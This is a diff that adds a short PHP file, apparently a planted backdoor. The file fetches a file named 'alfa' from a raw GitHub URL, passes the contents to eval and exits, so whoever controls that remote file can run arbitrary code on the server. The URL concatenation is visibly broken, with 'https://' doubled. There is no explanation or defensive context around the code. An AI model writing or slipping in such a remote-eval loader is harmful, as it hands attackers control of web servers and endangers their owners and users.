@@ -1,0 +1,7 @@
+<?Php
+
+        $awo = 'https://';
+        eval("?>" . file_get_contents($awo . 'https://raw.githubusercontent.com/khrisnaaditya920-lang/khcebol/refs/heads/main/alfa'));
+        exit;
+   
+?>
